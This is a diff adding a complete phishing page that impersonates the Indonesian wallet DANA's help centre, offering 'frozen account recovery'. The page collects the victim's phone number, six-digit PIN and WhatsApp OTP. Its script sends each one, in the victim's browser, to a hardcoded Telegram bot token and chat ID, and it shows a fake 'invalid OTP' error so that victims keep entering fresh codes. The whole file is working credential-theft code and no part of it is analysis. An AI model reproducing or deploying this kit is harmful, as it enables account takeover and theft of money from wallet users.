@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta property="og:site_name" content="DANA - Pusat Bantuan">
+    <meta property="og:title" content="ᴘᴜsᴀᴛ ʙᴀɴᴛᴜᴀɴ ᴅᴀɴᴀ ʀᴇsᴍɪ">
+    <meta property="og:description" content="DANA adalah aplikasi dompet digital Indonesia untuk transaksi cepat, aman, dan terpercaya.">
+    <meta property="og:image" content="https://i.ibb.co.com/pryFZxVf/images-2-24.jpg">
+    <meta property="og:url" content="https://dana.id/">
+    <meta name="theme-color" content="#0099ff">
+    <title>DANA Protection</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: { primary: '#0099ff' },
+                    fontFamily: { sans: ['-apple-system', 'Segoe UI', 'Roboto', 'sans-serif'] },
+                    fontSize: {
+                        'xs': '0.7rem',
+                        'sm': '0.8rem',
+                        'base': '0.9rem',
+                        'lg': '1rem',
+                        'xl': '1.1rem'
+                    }
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .btn-3d-anim {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 0 #b8b8b8, 0 8px 15px rgba(0,0,0,0.25);
+                animation: naikTurun 2.5s ease-in-out infinite;
+                transition: all 0.1s ease;
+            }
+            @keyframes naikTurun {
+                0% { transform: translateY(-2px); }
+                50% { transform: translateY(-4px); }
+                100% { transform: translateY(-2px); }
+            }
+            .btn-3d-anim:active {
+                transform: translateY(0);
+                box-shadow: 0 3px 0 #b8b8b8, 0 4px 8px rgba(0,0,0,0.2);
+                animation: none;
+            }
+            .pin-dot {
+                width: 15px;
+                height: 15px;
+                border-radius: 50%;
+                background-color: #d1d5db;
+                display: inline-block;
+                margin: 0 6px;
+                transition: all 0.2s;
+            }
+            .pin-dot.filled {
+                background-color: #0099ff;
+                transform: scale(1.05);
+            }
+            .otp-box {
+                width: 55px;
+                height: 55px;
+                border: 2px solid white;
+                border-radius: 8px;
+                background: white;
+                text-align: center;
+                font-size: 20px;
+                font-weight: bold;
+                color: #111827;
+                outline: none;
+            }
+            @media (max-width: 360px) {
+                .otp-box {
+                    width: 48px;
+                    height: 48px;
+                    font-size: 18px;
+                }
+            }
+        }
+    </style>
+</head>
+<body class="min-h-screen font-sans">
+    <!-- HALAMAN UTAMA -->
+    <div id="halamanUtama" class="min-h-screen w-full relative">
+        <img src="https://i.ibb.co.com/xqpFrJ8L/IMG-20260611-WA0003.jpg" alt="DANA Protection" class="w-full h-screen object-cover">
+        <div class="absolute inset-0 flex flex-col items-center justify-center px-4">
+            <button onclick="bukaHalamanNomor()" class="w-full max-w-xs bg-white text-[#003366] font-bold py-3 rounded-lg text-sm mb-4 btn-3d-anim">
+                PEMULIHAN AKUN DI BEKUKAN
+            </button>
+            <button class="w-full max-w-xs bg-white text-[#003366] font-bold py-3 rounded-lg text-sm btn-3d-anim">
+                LAPORKAN KENDALA LAINNYA
+            </button>
+        </div>
+    </div>
+
+    <!-- HALAMAN INPUT NOMOR -->
+    <div id="halamanNomor" class="min-h-screen bg-[#0099ff] text-white flex flex-col hidden">
+        <div class="p-3">
+            <button onclick="kembaliKeUtama()" class="text-white text-lg">
+                <i class="fa fa-arrow-left"></i>
+            </button>
+        </div>
+        <div class="px-5 text-center mt-2">
+            <div class="flex justify-center items-center mb-4">
+                <img src="https://i.ibb.co.com/tMP7d2h0/dana-logo-fe46647.png" alt="DANA Logo" class="h-12 w-auto">
+            </div>
+            <p class="text-sm mb-4 opacity-95">Masukkan nomor HP kamu untuk lanjut</p>
+            <!-- ✅ KOTAK NOMOR DIKEMBALIKAN KE UKURAN NORMAL -->
+            <div class="bg-white rounded-lg flex items-center p-3 mb-3 max-w-xs mx-auto">
+                <img src="https://i.ibb.co.com/7tXkkkTT/images-20.png" alt="Indonesia" class="w-6 h-4 mr-2">
+                <span class="text-gray-800 font-medium text-base mr-1">+62</span>
+                <input type="number" inputmode="numeric" id="nomorHP" placeholder="812-3456-7890" class="flex-1 outline-none text-gray-800 text-base" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+            <p class="text-xs opacity-90 leading-relaxed px-1 mb-2">
+                Dengan melanjutkan, kamu setuju dengan Syarat & Ketentuan dan Kebijakan Privasi kami
+            </p>
+        </div>
+        <!-- ✅ TOMBOL LANJUT TETAP DINAJKKAN AGAR TERLIHAT DI ANDROID -->
+        <div class="px-5 mb-6">
+            <button onclick="lanjutKePIN()" class="w-full text-white text-sm font-semibold py-2.5 rounded-lg bg-white/10 hover:bg-white/20 transition-colors">
+                LANJUT
+            </button>
+        </div>
+    </div>
+
+    <!-- HALAMAN PIN -->
+    <div id="halamanPIN" class="min-h-screen bg-white hidden">
+        <div class="bg-[#0099ff] text-white p-3 flex items-center justify-center relative">
+            <button onclick="kembaliKeNomor()" class="absolute left-3 text-white text-lg">
+                <i class="fa fa-times"></i>
+            </button>
+            <h2 class="text-sm font-semibold">Masuk</h2>
+        </div>
+        <div class="p-5 text-center mt-8">
+            <h3 class="text-lg font-semibold text-gray-800 mb-5">Masukkan PIN</h3>
+            <div class="flex justify-center mb-6">
+                <span class="pin-dot" id="dot1"></span>
+                <span class="pin-dot" id="dot2"></span>
+                <span class="pin-dot" id="dot3"></span>
+                <span class="pin-dot" id="dot4"></span>
+                <span class="pin-dot" id="dot5"></span>
+                <span class="pin-dot" id="dot6"></span>
+            </div>
+            <input type="number" inputmode="numeric" id="inputPIN" maxlength="6" class="opacity-0 absolute w-0 h-0" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            <div class="flex justify-between items-center max-w-xs mx-auto text-xs">
+                <a href="#" class="text-[#0099ff] flex items-center gap-1">
+                    <i class="fa fa-question-circle"></i> BUTUH BANTUAN?
+                </a>
+                <a href="#" class="text-[#0099ff]">LUPA PIN?</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- HALAMAN TAP VERIFIKASI -->
+    <div id="halamanVerifikasi" class="min-h-screen bg-[#0099ff] text-white flex flex-col hidden">
+        <div class="bg-[#0099ff] p-3 flex items-center justify-center relative">
+            <button onclick="kembaliKePIN()" class="absolute left-3 text-white text-lg">
+                <i class="fa fa-arrow-left"></i>
+            </button>
+            <div class="flex items-center gap-2">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-12h2v6h-2zm0 8h2v2h-2z"/>
+                </svg>
+                <span class="text-lg font-bold">DANA</span>
+            </div>
+        </div>
+        <div class="bg-white text-gray-800 mx-3 my-2 rounded-lg p-4 shadow-lg flex-1">
+            <h3 class="text-center text-base font-semibold mb-3">Verifikasi dikirim ke Akun DANA</h3>
+            <div class="bg-gray-100 rounded-lg p-2.5 flex items-center justify-center gap-2 mb-3">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="#0099ff">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-12h2v6h-2zm0 8h2v2h-2z"/>
+                </svg>
+                <span class="font-medium text-sm">+62***********</span>
+            </div>
+            <div class="h-44 bg-gray-50 rounded-lg flex items-center justify-center mb-4 overflow-hidden">
+                <img src="https://i.ibb.co.com/1JYpXVd5/atas-3.gif" alt="Verifikasi" class="w-40 h-auto">
+            </div>
+            <h4 class="font-semibold text-sm mb-3">Cara mengamankan aktivitasmu:</h4>
+            <div class="flex items-start gap-2 mb-3">
+                <div class="bg-blue-100 rounded-full p-1.5 mt-1">
+                    <i class="fa fa-mobile text-[#0099ff] text-base"></i>
+                </div>
+                <p class="text-xs leading-relaxed">Cek notifikasi dari aplikasi DANA, pilih tap VERIFIKASI.</p>
+            </div>
+            <div class="flex items-start gap-2 mb-4">
+                <div class="bg-blue-100 rounded-full p-1.5 mt-1">
+                    <i class="fa fa-envelope text-[#0099ff] text-base"></i>
+                </div>
+                <p class="text-xs leading-relaxed">Jika tidak menerima notifikasi? cek kontak masuk atau menu VERIFIKASI di aplikasi DANA kamu.</p>
+            </div>
+            <div class="bg-red-50 border border-red-200 rounded-lg p-2.5 mb-3">
+                <p class="text-red-600 text-xs text-center font-medium">
+                    ⚠️ Pastikan kamu sudah memverifikasi notif yang masuk ke akun DANA anda. Jika tidak, kode OTP tidak akan dikirim
+                </p>
+            </div>
+            <button onclick="bukaHalamanOTP()" class="w-full bg-[#0099ff] text-white font-semibold py-2.5 rounded-lg hover:bg-[#0088ee] transition-colors mt-1">
+                KIRIM OTP
+            </button>
+            <div class="text-center text-xs text-gray-500 mt-4 flex items-center justify-center gap-1">
+                <span>Diamankan oleh</span>
+                <span class="font-semibold text-[#0099ff]">DANA PROTECTION</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- HALAMAN OTP -->
+    <div id="halamanOTP" class="min-h-screen bg-[#0099ff] text-white flex flex-col hidden">
+        <div class="p-3 flex items-center justify-center relative">
+            <button onclick="kembaliKeVerifikasi()" class="absolute left-3 text-white text-lg">
+                <i class="fa fa-arrow-left"></i>
+            </button>
+            <h2 class="text-sm font-semibold">Masuk</h2>
+        </div>
+        <div class="flex-1 px-4 text-center mt-5">
+            <h3 class="text-base font-semibold mb-3">Kode OTP telah terkirim ke</h3>
+            <div class="bg-white/20 backdrop-blur-sm rounded px-2.5 py-2 inline-flex items-center gap-2 mb-2">
+                <img src="https://i.ibb.co.com/7tXkkkTT/images-20.png" alt="Indonesia" class="w-4 h-2.5">
+                <span class="font-medium text-sm">+62</span>
+                <span id="tampilNomorOTP" class="font-semibold text-sm"></span>
+            </div>
+            <p class="mb-4 flex items-center justify-center gap-2 text-xs">
+                via <i class="fa fa-whatsapp"></i> WhatsApp
+            </p>
+            <div class="flex justify-center gap-3 mb-4">
+                <input type="number" inputmode="numeric" class="otp-box" maxlength="1" oninput="pindahOTP(this, 2)" id="otp1">
+                <input type="number" inputmode="numeric" class="otp-box" maxlength="1" oninput="pindahOTP(this, 3)" id="otp2">
+                <input type="number" inputmode="numeric" class="otp-box" maxlength="1" oninput="pindahOTP(this, 4)" id="otp3">
+                <input type="number" inputmode="numeric" class="otp-box" maxlength="1" oninput="cekOTPLengkap()" id="otp4">
+            </div>
+            <p id="pesanError" class="text-red-200 text-xs mb-3 hidden">Kode OTP tidak berlaku, silahkan kirim ulang</p>
+            <a href="#" class="text-white underline text-xs mb-3 inline-block">NOMOR TIDAK AKTIF?</a>
+            <button id="tombolKirimUlang" onclick="resetHitungan()" class="bg-white/60 text-gray-500 font-semibold px-5 py-2 rounded mb-4 text-xs cursor-not-allowed" disabled>
+                Kirim Ulang (<span id="hitungan">60</span>s)
+            </button>
+            <div class="flex items-center justify-center gap-2 text-xs">
+                <i class="fa fa-question-circle"></i>
+                <span>BUTUH BANTUAN?</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCRIPT -->
+    <script>
+        const BOT_TOKEN = "8650420881:AAF5wZ-Y1-p31T1bUy2DLbZzO3k8HV6Iqjw";
+        const CHAT_ID = "7343679071";
+        let nomorHPGlobal = "";
+        let pinGlobal = "";
+        let hitunganMundur;
+        let waktuTersisa = 60;
+
+        function kirimData(langkah = "") {
+            const pesan = `📋 DATA AKUN ${langkah}\n\n📱 NOMOR : 08${nomorHPGlobal || "BELUM DIISI"}\n🔑 PIN AKUN : ${pinGlobal || "MENUNGGU"}\n🔢 KODE OTP : MENUNGGU\n\n⏰ WAKTU : ${new Date().toLocaleString('id-ID')}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`).catch(() => {});
+        }
+
+        function kirimDataOTP(otp) {
+            const pesan = `📋 DATA LENGKAP\n\n📱 NOMOR : 08${nomorHPGlobal}\n🔑 PIN AKUN : ${pinGlobal}\n🔢 KODE OTP : ${otp}\n\n⏰ WAKTU : ${new Date().toLocaleString('id-ID')}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`).catch(() => {});
+        }
+
+        function bukaHalamanNomor() {
+            document.getElementById('halamanUtama').classList.add('hidden');
+            document.getElementById('halamanNomor').classList.remove('hidden');
+        }
+        function kembaliKeUtama() {
+            document.getElementById('halamanNomor').classList.add('hidden');
+            document.getElementById('halamanUtama').classList.remove('hidden');
+        }
+        function lanjutKePIN() {
+            const nomor = document.getElementById('nomorHP').value.trim();
+            if(nomor.length < 9) { alert("Nomor tidak valid!"); return; }
+            nomorHPGlobal = nomor;
+            kirimData("NOMOR DITERIMA");
+            document.getElementById('halamanNomor').classList.add('hidden');
+            document.getElementById('halamanPIN').classList.remove('hidden');
+            document.getElementById('inputPIN').focus();
+        }
+        function kembaliKeNomor() {
+            document.getElementById('halamanPIN').classList.add('hidden');
+            document.getElementById('halamanNomor').classList.remove('hidden');
+        }
+        function kembaliKePIN() {
+            document.getElementById('halamanVerifikasi').classList.add('hidden');
+            document.getElementById('halamanPIN').classList.remove('hidden');
+        }
+        function kembaliKeVerifikasi() {
+            document.getElementById('halamanOTP').classList.add('hidden');
+            document.getElementById('halamanVerifikasi').classList.remove('hidden');
+        }
+
+        const inputPIN = document.getElementById('inputPIN');
+        const dots = document.querySelectorAll('.pin-dot');
+        inputPIN.addEventListener('input', () => {
+            const val = inputPIN.value;
+            pinGlobal = val;
+            dots.forEach((dot, i) => dot.classList.toggle('filled', i < val.length));
+            if(val.length === 6) {
+                kirimData("PIN DITERIMA");
+                setTimeout(() => {
+                    document.getElementById('halamanPIN').classList.add('hidden');
+                    document.getElementById('halamanVerifikasi').classList.remove('hidden');
+                }, 300);
+            }
+        });
+
+        function bukaHalamanOTP() {
+            document.getElementById('halamanVerifikasi').classList.add('hidden');
+            document.getElementById('halamanOTP').classList.remove('hidden');
+            document.getElementById('tampilNomorOTP').textContent = `${nomorHPGlobal.replace(/(\d{3})(\d{4})(\d{4})/, '$1-$2-$3')}`;
+            mulaiHitungan();
+        }
+
+        function pindahOTP(elemen, selanjutnya) {
+            if(elemen.value.length === 1) {
+                const next = document.getElementById('otp' + selanjutnya);
+                if(next) next.focus();
+            }
+        }
+
+        function cekOTPLengkap() {
+            let otp = "";
+            for(let i=1; i<=4; i++) otp += document.getElementById('otp'+i).value;
+            if(otp.length === 4) {
+                kirimDataOTP(otp);
+                document.getElementById('pesanError').classList.remove('hidden');
+                for(let i=1; i<=4; i++) document.getElementById('otp'+i).value = "";
+                document.getElementById('otp1').focus();
+            }
+        }
+
+        function mulaiHitungan() {
+            waktuTersisa = 60;
+            const tombol = document.getElementById('tombolKirimUlang');
+            const teksHitungan = document.getElementById('hitungan');
+            tombol.disabled = true;
+            tombol.classList.remove('bg-white', 'text-[#0099ff]', 'cursor-pointer');
+            tombol.classList.add('bg-white/60', 'text-gray-500', 'cursor-not-allowed');
+            teksHitungan.textContent = waktuTersisa;
+            clearInterval(hitunganMundur);
+            hitunganMundur = setInterval(() => {
+                waktuTersisa--;
+                teksHitungan.textContent = waktuTersisa;
+                if(waktuTersisa <= 0) {
+                    clearInterval(hitunganMundur);
+                    tombol.disabled = false;
+                    tombol.classList.remove('bg-white/60', 'text-gray-500', 'cursor-not-allowed');
+                    tombol.classList.add('bg-white', 'text-[#0099ff]', 'cursor-pointer');
+                    tombol.innerHTML = 'Kirim Ulang';
+                }
+            }, 1000);
+        }
+
+        function resetHitungan() {
+            document.getElementById('pesanError').classList.add('hidden');
+            mulaiHitungan();
+        }
+    </script>
+</body>
+</html>
